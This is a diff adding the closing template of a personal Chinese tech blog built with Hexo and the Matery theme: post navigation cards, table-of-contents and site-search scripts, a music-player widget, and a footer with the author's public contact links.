+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-03-18
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            妖寂
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/03/16/ji-suan-ji-xi-tong-ji-chu/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="计算机系统基础">
+                        
+                        <span class="card-title">计算机系统基础</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-03-16
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            妖寂
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;TOC</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="30431376"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2021</span>
+            
+            <span id="year">2021</span>
+            <a href="/about" target="_blank">妖寂</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/AiriSuzuki" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1151273235@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1151273235" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1151273235" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+    <a href="https://weibo.com/6547806910/profile?topnav=1&amp;wvr=6&amp;is_all=1" class="tooltipped" target="_blank" data-tooltip="关注我的微博: https://weibo.com/6547806910/profile?topnav=1&amp;wvr=6&amp;is_all=1" data-position="top" data-delay="50">
+        <i class="fab fa-weibo"></i>
+    </a>
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;Search</span>
+            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
